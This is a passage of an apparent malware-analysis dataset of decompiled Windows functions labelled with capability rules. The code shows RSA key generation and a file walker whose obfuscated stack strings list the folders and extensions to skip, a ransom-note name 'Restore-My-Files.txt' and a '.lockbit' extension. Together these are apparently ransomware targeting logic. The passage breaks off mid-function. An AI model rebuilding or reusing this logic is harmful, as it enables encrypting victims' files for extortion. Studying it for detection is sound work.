        "decompiled_code": "\nuint __cdecl fcn.0040bc90(uint32_t *arg_8h, int32_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if (arg_10h == 0) {\n        return 0xfffffff4;\n    }\n    if (arg_10h < 0) {\n        return 0xfffffff6;\n    }\n    if (arg_10h == 1) {\n        *arg_8h = 0;\n        return 0;\n    }\n    if (arg_10h != 2) {\n        iVar4 = arg_ch[1];\n        uVar2 = 0;\n        if (iVar4 != 0) {\n            puVar3 = arg_ch[2] + (iVar4 + -1) * 4;\n            do {\n                uVar1 = *puVar3;\n                puVar3 = puVar3 + -1;\n                uVar2 = (uVar1 & 0xffff | (uVar1 >> 0x10 | uVar2 << 0x10) % arg_10h << 0x10) % arg_10h;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        if ((*arg_ch < 0) && (uVar2 != 0)) {\n            uVar2 = arg_10h - uVar2;\n        }\n        *arg_8h = uVar2;\n        return 0;\n    }\n    *arg_8h = *arg_ch[2] & 1;\n    return 0;\n}\n",
        "token_count": 376
    },
    "0040c740": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c740(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t arg_10h;\n    int32_t iVar3;\n    int32_t var_10h;\n    uint var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = arg_8h;\n    if ((**(arg_8h + 8) & 1) == 0) {\ncode_r0x0040c7c5:\n        iVar1 = -0xe;\n    }\n    else {\n        var_8h = &arg_8h;\n        var_ch = 1;\n        iVar3 = 0;\n        arg_10h = 3;\n        while( true ) {\n            uVar2 = arg_10h >> 0x1f;\n            arg_8h = (arg_10h ^ uVar2) - uVar2;\n            var_10h = (uVar2 & 0xfffffffe) + 1;\n            iVar1 = fcn.00409e80(arg_8h_00, &var_10h);\n            if (iVar1 < 1) {\n                return 1;\n            }\n            iVar1 = fcn.0040bc90(&var_4h, arg_8h_00, arg_10h);\n            if (iVar1 != 0) break;\n            if (var_4h == 0) goto code_r0x0040c7c5;\n            arg_10h = *(iVar3 * 4 + 0x41d584);\n            iVar3 = iVar3 + 1;\n            if (arg_10h < 1) {\n                return 0;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 415
    },
    "0040d440": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d440(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t arg_8h_01;\n    uint var_30h;\n    uint var_24h;\n    int32_t var_18h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (((arg_14h < 0x80) || (arg_18h < 3)) || ((arg_14h & 1) != 0)) {\n        return -0x4080;\n    }\n    var_4h = -(0x400 < arg_14h) & 2;\n    fcn.0040b4e0(&var_18h);\n    fcn.0040b4e0(&var_24h);\n    fcn.0040b4e0(&var_30h);\n    var_ch = arg_8h + 0x14;\n    iVar1 = fcn.0040bbf0(var_ch, arg_18h);\n    if (iVar1 == 0) {\n        var_8h = arg_14h >> 1;\n        arg_8h_00 = arg_8h + 0x2c;\n        iVar1 = fcn.0040b090(arg_8h_00, var_8h, var_4h, arg_ch, arg_10h);\n        if (iVar1 == 0) {\n            arg_8h_01 = arg_8h + 0x38;\n            do {\n                iVar1 = fcn.0040b090(arg_8h_01, var_8h, var_4h, arg_ch, arg_10h);\n                if ((iVar1 != 0) || (iVar1 = fcn.0040c550(&var_18h, arg_8h_00, arg_8h_01),  iVar1 != 0)) break;\n                uVar2 = fcn.00409d40(&var_18h);\n                uVar4 = var_8h - 99;\n                if (arg_14h < 200) {\n                    uVar4 = 0;\n                }\n                if (uVar4 < uVar2) {\n                    if (var_18h < 0) {\n                        fcn.0040c5c0(arg_8h_00, arg_8h_01);\n                    }\n                    iVar1 = fcn.0040c510(arg_8h_00, arg_8h_00, 1);\n                    if (((iVar1 != 0) || (iVar1 = fcn.0040c510(arg_8h_01, arg_8h_01, 1),  iVar1 != 0)) ||\n                       ((iVar1 = fcn.0040bf10(&var_18h, arg_8h_00, arg_8h_01),  iVar1 != 0 ||\n                        (iVar1 = fcn.0040ae20(&var_24h, var_ch, &var_18h),  iVar1 != 0)))) break;\n                    iVar1 = fcn.00409e40(&var_24h, 1);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.0040ae20(&var_24h, arg_8h_00, arg_8h_01);\n                        if (((iVar1 != 0) || (iVar1 = fcn.0040a040(&var_30h, 0, &var_18h, &var_24h),  iVar1 != 0)) ||\n                           (iVar1 = fcn.0040b500(arg_8h + 0x20, var_ch, &var_30h),  iVar1 != 0)) break;\n                        uVar2 = fcn.00409d40(arg_8h + 0x20);\n                        if (arg_14h + 1 >> 1 < uVar2) {\n                            iVar1 = fcn.00409c90(arg_8h_00, arg_8h_00, 1);\n                            if (((iVar1 == 0) && (iVar1 = fcn.00409c90(arg_8h_01, arg_8h_01, 1),  iVar1 == 0)) &&\n                               (iVar1 = fcn.0040bf10(arg_8h + 8, arg_8h_00, arg_8h_01),  iVar1 == 0)) {\n                                uVar3 = fcn.0040c420(arg_8h + 8);\n                                *(arg_8h + 4) = uVar3;\n                                iVar1 = fcn.0040edc0(arg_8h_00, arg_8h_01, arg_8h + 0x20, arg_8h + 0x44, arg_8h + 0x50, \n                                                     arg_8h + 0x5c);\n                                if (iVar1 == 0) {\n                                    iVar1 = fcn.0040d0b0(arg_8h);\n                                }\n                            }\n                            break;\n                        }\n                    }\n                }\n                iVar1 = fcn.0040b090(arg_8h_00, var_8h, var_4h, arg_ch, arg_10h);\n            } while (iVar1 == 0);\n        }\n    }\n    fcn.0040add0(&var_18h);\n    fcn.0040add0(&var_24h);\n    fcn.0040add0(&var_30h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.0040d3a0(arg_8h);\n    return iVar1 + -0x4180;\n}\n",
        "token_count": 1335
    },
    "0040fdb0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.0040fdb0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t in_FS_OFFSET;\n    int32_t iStack20;\n    uint auStack12 [2];\n    \n    auStack12[0] = 0;\n    iVar4 = (*_sym.imp.SHELL32.dll_CommandLineToArgvW)(*(*(*(in_FS_OFFSET + 0x30) + 0x10) + 0x44), auStack12);\n    if (1 < iStack20) {\n        iVar5 = fcn.00419330();\n        if (iVar5 == 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        }\n        pcVar3 = _sym.imp.KERNEL32.dll_GetFileAttributesW;\n        pcVar2 = _sym.imp.KERNEL32.dll_SetFileAttributesW;\n        iVar5 = 1;\n        pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n        if (1 < iStack20) {\n            do {\n                uVar6 = (*pcVar3)(*(iVar4 + iVar5 * 4));\n                if (uVar6 != 0xffffffff) {\n                    if ((uVar6 & 0x10) == 0) {\n                        if ((uVar6 & 1) != 0) {\n                            (*pcVar2)(*(iVar4 + iVar5 * 4), 0x80);\n                        }\n                        fcn.00419500();\n                    }\n                    else {\n                        fcn.00410530();\n                    }\n                }\n                iVar5 = iVar5 + 1;\n                pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n            } while (iVar5 < iStack20);\n        }\n        do {\n            (*pcVar1)(10);\n        } while (*0x428420 != 0);\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        pcVar1 = swi(3);\n        uVar7 = (*pcVar1)();\n        return uVar7;\n    }\n    return 0;\n}\n",
        "token_count": 482
    },
    "00410530": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00410530(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    code *pcVar12;\n    uint lpFileName;\n    uchar auStack2558 [2];\n    uint var_9f8h;\n    uint32_t var_7e8h;\n    uint pszPath;\n    int16_t var_7b8h;\n    uint var_594h;\n    uint var_590h;\n    uint var_58ch;\n    uint var_588h;\n    uint var_584h;\n    uint var_580h;\n    uint var_57ch;\n    uint var_578h;\n    uint var_574h;\n    uint var_570h;\n    uint var_56ch;\n    uint var_568h;\n    uint var_564h;\n    uint var_560h;\n    uint var_55ch;\n    uint var_558h;\n    uint var_554h;\n    uint var_550h;\n    uint var_54ch;\n    uint var_548h;\n    uint var_544h;\n    uint var_540h;\n    uint var_53ch;\n    uint var_538h;\n    uint var_534h;\n    uint var_530h;\n    uint var_52ch;\n    uint var_528h;\n    uint var_524h;\n    uint var_520h;\n    uint var_51ch;\n    uint var_518h;\n    uint var_514h;\n    uint var_510h;\n    uint var_50ch;\n    uint var_508h;\n    uint var_504h;\n    uint var_500h;\n    uint var_4fch;\n    uint var_4f8h;\n    uint var_4f4h;\n    uint var_4f0h;\n    uint var_4ech;\n    uint var_4e8h;\n    uint var_4e4h;\n    uint var_4e0h;\n    uint var_4dch;\n    uint var_4d8h;\n    uint var_4d4h;\n    uint var_4d0h;\n    uint var_4cch;\n    uint var_4c8h;\n    uint var_4c4h;\n    uint var_4c0h;\n    uint var_4bch;\n    uint var_4b8h;\n    uint var_4b4h;\n    uint var_4b0h;\n    uint var_4ach;\n    uint var_4a8h;\n    uint var_4a4h;\n    uint var_4a0h;\n    uint var_49ch;\n    uint var_498h;\n    uint var_494h;\n    uint var_490h;\n    uint var_48ch;\n    uint var_488h;\n    uint var_484h;\n    uint var_480h;\n    uint var_47ch;\n    uint var_478h;\n    uint var_474h;\n    uint var_470h;\n    uint var_46ch;\n    uint var_468h;\n    uint var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_458h;\n    uint var_454h;\n    uint var_450h;\n    uint var_44ch;\n    uint var_448h;\n    uint var_444h;\n    uint var_440h;\n    uint var_43ch;\n    uint var_438h;\n    uint var_434h;\n    uint var_430h;\n    uint var_42ch;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_414h;\n    uint var_410h;\n    uint var_40ch;\n    uint var_408h;\n    uint var_404h;\n    uint var_400h;\n    uint var_3fch;\n    uint var_3f8h;\n    uint var_3f4h;\n    uint var_3f0h;\n    uint var_3ech;\n    uint var_3e8h;\n    uint var_3e4h;\n    uint var_3e0h;\n    uint var_3dch;\n    uint var_3d8h;\n    uint var_3d4h;\n    uint var_3d0h;\n    uint var_3cch;\n    uint var_3c8h;\n    uint var_3c4h;\n    uint var_3c0h;\n    uint var_3bch;\n    uint var_3b8h;\n    uint var_3b4h;\n    uint var_3b0h;\n    uint var_3ach;\n    uint var_3a8h;\n    uint var_3a4h;\n    uint var_3a0h;\n    uint var_39ch;\n    uint var_398h;\n    uint var_394h;\n    uint var_390h;\n    uint var_38ch;\n    uint var_388h;\n    uint var_384h;\n    uint var_380h;\n    uint var_37ch;\n    uint var_378h;\n    uint var_374h;\n    uint var_370h;\n    uint var_36ch;\n    uint var_368h;\n    uint var_364h;\n    uint var_360h;\n    uint var_35ch;\n    uint var_358h;\n    uint var_354h;\n    uint var_350h;\n    uint var_34ch;\n    uint var_348h;\n    uint var_344h;\n    uint var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    uint var_32ch;\n    uint var_328h;\n    uint var_324h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_318h;\n    uint var_314h;\n    uint var_310h;\n    uint var_30ch;\n    uint var_308h;\n    uint var_304h;\n    uint var_300h;\n    uint var_2fch;\n    uint var_2f8h;\n    uint var_2f4h;\n    uint var_2f0h;\n    uint var_2ech;\n    uint var_2e8h;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint ARG_1;\n    uint var_10h;\n    uint var_ch;\n    int16_t *var_8h;\n    int32_t var_4h;\n    \n    ARG_1 = 0x730025;\n    var_10h = 0x2a005c;\n    var_ch._0_2_ = 0;\n    var_8h = param_1;\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpFileName, &ARG_1, param_1);\n    iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileExW)(&lpFileName, 0, &var_7e8h, 0, 0, 0);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrcmpiW;\n    var_4h = iVar4;\n    if (iVar4 != -1) {\n        var_3e0h = 0x770024;\n        var_3dch = 0x6e0069;\n        var_3d8h = 0x6f0064;\n        var_3d4h = 0x730077;\n        var_3d0h = 0x7e002e;\n        var_3cch = 0x740062;\n        var_3c8h._0_2_ = 0;\n        var_200h = 0x6e0069;\n        var_1fch = 0x650074;\n        var_1f8h = 0x6c;\n        var_2b0h = 0x73006d;\n        var_2ach = 0x63006f;\n        var_2a8h = 0x630061;\n        var_2a4h = 0x650068;\n        var_2a0h._0_2_ = 0;\n        var_3fch = 0x720024;\n        var_3f8h = 0x630065;\n        var_3f4h = 0x630079;\n        var_3f0h = 0x65006c;\n        var_3ech = 0x62002e;\n        var_3e8h = 0x6e0069;\n        var_3e4h._0_2_ = 0;\n        var_418h = 0x770024;\n        var_414h = 0x6e0069;\n        var_410h = 0x6f0064;\n        var_40ch = 0x730077;\n        var_408h = 0x7e002e;\n        var_404h = 0x730077;\n        var_400h._0_2_ = 0;\n        var_394h = 0x6f0074;\n        var_390h = 0x200072;\n        var_38ch = 0x720062;\n        var_388h = 0x77006f;\n        var_384h = 0x650073;\n        var_380h = 0x72;\n        var_20h = 0x6f0062;\n        var_1ch = 0x74006f;\n        var_18h._0_2_ = 0;\n        var_37ch = 0x690057;\n        var_378h = 0x64006e;\n        var_374h = 0x77006f;\n        var_370h = 0x200073;\n        var_36ch = 0x74006e;\n        var_368h._0_2_ = 0;\n        var_28ch = 0x73004d;\n        var_288h = 0x750062;\n        var_284h = 0x6c0069;\n        var_280h = 100;\n        var_328h = 0x69004d;\n        var_324h = 0x720063;\n        var_320h = 0x73006f;\n        var_31ch = 0x66006f;\n        var_318h = 0x74;\n        var_33ch = 0x6c0041;\n        var_338h = 0x20006c;\n        var_334h = 0x730075;\n        var_330h = 0x720065;\n        var_32ch = 0x73;\n        var_594h = 0x790073;\n        var_590h = 0x740073;\n        var_58ch = 0x6d0065;\n        var_588h = 0x760020;\n        var_584h = 0x6c006f;\n        var_580h = 0x6d0075;\n        var_57ch = 0x200065;\n        var_578h = 0x6e0069;\n        var_574h = 0x6f0066;\n        var_570h = 0x6d0072;\n        var_56ch = 0x740061;\n        var_568h = 0x6f0069;\n        var_564h = 0x6e;\n        var_2c4h = 0x650070;\n        var_2c0h = 0x660072;\n        var_2bch = 0x6f006c;\n        var_2b8h = 0x730067;\n        var_2b4h._0_2_ = 0;\n        var_24ch = 0x6f0067;\n        var_248h = 0x67006f;\n        var_244h = 0x65006c;\n        var_240h._0_2_ = 0;\n        var_4ech = 0x700061;\n        var_4e8h = 0x6c0070;\n        var_4e4h = 0x630069;\n        var_4e0h = 0x740061;\n        var_4dch = 0x6f0069;\n        var_4d8h = 0x20006e;\n        var_4d4h = 0x610064;\n        var_4d0h = 0x610074;\n        var_4cch._0_2_ = 0;\n        var_26ch = 0x690077;\n        var_268h = 0x64006e;\n        var_264h = 0x77006f;\n        var_260h = 0x73;\n        var_3ach = 0x690077;\n        var_3a8h = 0x64006e;\n        var_3a4h = 0x77006f;\n        var_3a0h = 0x2e0073;\n        var_39ch = 0x6c006f;\n        var_398h = 100;\n        var_27ch = 0x700061;\n        var_278h = 0x640070;\n        var_274h = 0x740061;\n        var_270h = 0x61;\n        var_29ch = 0x6f006d;\n        var_298h = 0x69007a;\n        var_294h = 0x6c006c;\n        var_290h = 0x61;\n        var_488h = 0x69004d;\n        var_484h = 0x720063;\n        var_480h = 0x73006f;\n        var_47ch = 0x66006f;\n        var_478h = 0x2e0074;\n        var_474h = 0x45004e;\n        var_470h = 0x54;\n        var_510h = 0x69006d;\n        var_50ch = 0x720063;\n        var_508h = 0x73006f;\n        var_504h = 0x66006f;\n        var_500h = 0x200074;\n        var_4fch = 0x680073;\n        var_4f8h = 0x720061;\n        var_4f4h = 0x640065;\n        var_4f0h._0_2_ = 0;\n        var_534h = 0x6e0049;\n        var_530h = 0x650074;\n        var_52ch = 0x6e0072;\n        var_528h = 0x740065;\n        var_524h = 0x450020;\n        var_520h = 0x700078;\n        var_51ch = 0x6f006c;\n        var_518h = 0x650072;\n        var_514h = 0x72;\n        var_434h = 0x6f0063;\n        var_430h = 0x6d006d;\n        var_42ch = 0x6e006f;\n        var_428h = 0x660020;\n        var_424h = 0x6c0069;\n        var_420h = 0x730065;\n        var_41ch._0_2_ = 0;\n        var_20ch = 0x70006f;\n        var_208h = 0x720065;\n        var_204h = 0x61;\n        var_4c8h = 0x690057;\n        var_4c4h = 0x64006e;\n        var_4c0h = 0x77006f;\n        var_4bch = 0x200073;\n        var_4b8h = 0x6f004a;\n        var_4b4h = 0x720075;\n        var_4b0h = 0x61006e;\n        var_4ach = 0x6c;\n        var_23ch = 0x74006e;\n        var_238h = 0x64006c;\n        var_234h = 0x72;\n        var_4a8h = 0x74006e;\n        var_4a4h = 0x730075;\n        var_4a0h = 0x720065;\n        var_49ch = 0x64002e;\n        var_498h = 0x740061;\n        var_494h = 0x6c002e;\n        var_490h = 0x67006f;\n        var_48ch._0_2_ = 0;\n        var_450h = 0x6f0062;\n        var_44ch = 0x74006f;\n        var_448h = 0x650073;\n        var_444h = 0x740063;\n        var_440h = 0x62002e;\n        var_43ch = 0x6b0061;\n        var_438h._0_2_ = 0;\n        var_3c4h = 0x750061;\n        var_3c0h = 0x6f0074;\n        var_3bch = 0x750072;\n        var_3b8h = 0x2e006e;\n        var_3b4h = 0x6e0069;\n        var_3b0h = 0x66;\n        var_364h = 0x680074;\n        var_360h = 0x6d0075;\n        var_35ch = 0x730062;\n        var_358h = 0x64002e;\n        var_354h = 0x62;\n        var_46ch = 0x630069;\n        var_468h = 0x6e006f;\n        var_464h = 0x610063;\n        var_460h = 0x680063;\n        var_45ch = 0x2e0065;\n        var_458h = 0x620064;\n        var_454h._0_2_ = 0;\n        var_560h = 0x650052;\n        var_55ch = 0x740073;\n        var_558h = 0x72006f;\n        var_554h = 0x2d0065;\n        var_550h = 0x79004d;\n        var_54ch = 0x46002d;\n        var_548h = 0x6c0069;\n        var_544h = 0x730065;\n        var_540h = 0x74002e;\n        var_53ch = 0x740078;\n        var_538h._0_2_ = 0;\n        var_218h = 0x730025;\n        var_214h = 0x25005c;\n        var_210h = 0x73;\n        var_2ch = 0x33002e;\n        var_28h = 0x360038;\n        var_24h._0_2_ = 0;\n        var_38h = 0x63002e;\n        var_34h = 0x64006d;\n        var_30h._0_2_ = 0;\n        var_50h = 0x61002e;\n        var_4ch = 0x69006e;\n        var_48h._0_2_ = 0;\n        var_5ch = 0x61002e;\n        var_58h = 0x760064;\n        var_54h._0_2_ = 0;\n        var_25ch = 0x74002e;\n        var_258h = 0x650068;\n        var_254h = 0x65006d;\n        var_250h._0_2_ = 0;\n        var_68h = 0x6d002e;\n        var_64h = 0x690073;\n        var_60h._0_2_ = 0;\n        var_74h = 0x6d002e;\n        var_70h = 0x700073;\n        var_6ch._0_2_ = 0;\n        var_80h = 0x63002e;\n        var_7ch = 0x6d006f;\n        var_78h._0_2_ = 0;\n        var_2d8h = 0x64002e;\n        var_2d4h = 0x610069;\n        var_2d0h = 0x700067;\n        var_2cch = 0x67006b;\n        var_2c8h._0_2_ = 0;\n        var_8ch = 0x6e002e;\n        var_88h = 0x73006c;\n        var_84h._0_2_ = 0;\n        var_2ech = 0x64002e;\n        var_2e8h = 0x610069;\n        var_2e4h = 0x630067;\n        var_2e0h = 0x620061;\n        var_2dch._0_2_ = 0;\n        var_224h = 0x6c002e;\n        var_220h = 0x63006f;\n        var_21ch = 0x6b;\n        var_98h = 0x6f002e;\n        var_94h = 0x780063;\n        var_90h._0_2_ = 0;\n        var_a4h = 0x6d002e;\n        var_a0h = 0x610070;\n        var_9ch._0_2_ = 0;\n        var_b0h = 0x63002e;\n        var_ach = 0x6c0070;\n        var_a8h._0_2_ = 0;\n        var_bch = 0x6d002e;\n        var_b8h = 0x64006f;\n        var_b4h._0_2_ = 0;\n        var_c8h = 0x68002e;\n        var_c4h = 0x610074;\n        var_c0h._0_2_ = 0;\n        var_230h = 0x69002e;\n        var_22ch = 0x6e0063;\n        var_228h = 0x73;\n        var_d4h = 0x70002e;\n        var_d0h = 0x660072;\n        var_cch._0_2_ = 0;\n        var_e0h = 0x72002e;\n        var_dch = 0x700074;\n        var_d8h._0_2_ = 0;\n        var_300h = 0x64002e;\n        var_2fch = 0x610069;\n        var_2f8h = 0x630067;\n        var_2f4h = 0x670066;\n        var_2f0h._0_2_ = 0;\n        var_350h = 0x6d002e;\n        var_34ch = 0x730073;\n        var_348h = 0x790074;\n        var_344h = 0x65006c;\n        var_340h = 0x73;\n        var_1f4h = 0x72002e;\n        var_1f0h = 0x700064;\n        var_1ech._0_2_ = 0;\n        var_ech = 0x62002e;\n        var_e8h = 0x6e0069;\n        var_e4h._0_2_ = 0;\n        var_f8h = 0x68002e;\n        var_f4h = 0x70006c;\n        var_f0h._0_2_ = 0;\n        var_104h = 0x73002e;\n        var_100h = 0x730068;\n        var_fch._0_2_ = 0;\n        var_110h = 0x64002e;\n        var_10ch = 0x760072;\n        var_108h._0_2_ = 0;\n        var_11ch = 0x77002e;\n        var_118h = 0x780070;\n        var_114h._0_2_ = 0;\n        var_128h = 0x62002e;\n        var_124h = 0x740061;\n        var_120h._0_2_ = 0;\n        var_134h = 0x72002e;\n        var_130h = 0x6d006f;\n        var_12ch._0_2_ = 0;\n        var_140h = 0x6d002e;\n        var_13ch = 0x630073;\n        var_138h._0_2_ = 0;\n        var_14ch = 0x73002e;\n        var_148h = 0x6c0070;\n        var_144h._0_2_ = 0;\n        var_158h = 0x70002e;\n        var_154h = 0x310073;\n        var_150h._0_2_ = 0;\n        var_164h = 0x6d002e;\n        var_160h = 0x750073;\n        var_15ch._0_2_ = 0;\n        var_170h = 0x69002e;\n        var_16ch = 0x730063;\n        var_168h._0_2_ = 0;\n        var_17ch = 0x6b002e;\n        var_178h = 0x790065;\n        var_174h._0_2_ = 0;\n        var_44h = 0x65002e;\n        var_40h = 0x650078;\n        var_3ch._0_2_ = 0;\n        var_1a0h = 0x64002e;\n        var_19ch = 0x6c006c;\n        var_198h._0_2_ = 0;\n        var_1e8h = 0x6c002e;\n        var_1e4h = 0x6b006e;\n        var_1e0h._0_2_ = 0;\n        var_1dch = 0x69002e;\n        var_1d8h = 0x6f0063;\n        var_1d4h._0_2_ = 0;\n        var_1d0h = 0x68002e;\n        var_1cch = 0x70006c;\n        var_1c8h._0_2_ = 0;\n        var_1c4h = 0x73002e;\n        var_1c0h = 0x730079;\n        var_1bch._0_2_ = 0;\n        var_1b8h = 0x69002e;\n        var_1b4h = 0x780064;\n        var_1b0h._0_2_ = 0;\n        var_1ach = 0x69002e;\n        var_1a8h = 0x69006e;\n        var_1a4h._0_2_ = 0;\n        var_194h = 0x72002e;\n        var_190h = 0x670065;\n        var_18ch._0_2_ = 0;\n        var_188h = 0x6d002e;\n        var_184h = 0x330070;\n        var_180h._0_2_ = 0;\n        var_314h = 0x6c002e;\n        var_310h = 0x63006f;\n        var_30ch = 0x62006b;\n        var_308h = 0x740069;\n        var_304h._0_2_ = 0;\n        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW;\n        do {\n            if (pszPath == 0x2e) {\n                iVar1 = pszPath._2_2_;\n                if (pszPath._2_2_ == 0x2e) {\n                    iVar1 = var_7b8h;\n                }\n                if (iVar1 != 0) goto code_r0x00411294;\n            }\n            else {\ncode_r0x00411294:\n                if ((var_7e8h & 0x10) == 0) {\n                    iVar7 = 0;\n                    puVar9 = &pszPath;\n                    if (pszPath != 0) {\n                        do {\n                            puVar9 = puVar9 + 2;\n                            iVar7 = iVar7 + 1;\n                        } while (*puVar9 != 0);\n                        if (4 < iVar7) {\n                            piVar5 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionW)(&pszPath);\n                            if ((piVar5 != NULL) && (iVar7 = 0,  piVar6 = piVar5,  *piVar5 != 0)) {\n                                do {\n                                    piVar6 = piVar6 + 1;\n                                    iVar7 = iVar7 + 1;\n                                } while (*piVar6 != 0);\n                                if ((0 < iVar7) &&\n                                   ((((((((iVar7 = (*pcVar2)(&var_2ch, piVar5), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                          (iVar7 = (*pcVar2)(&var_38h, piVar5), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                         (iVar7 = (*pcVar2)(&var_44h, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                        (((iVar7 = (*pcVar2)(&var_50h, piVar5), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                          (iVar7 = (*pcVar2)(&var_5ch, piVar5), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                         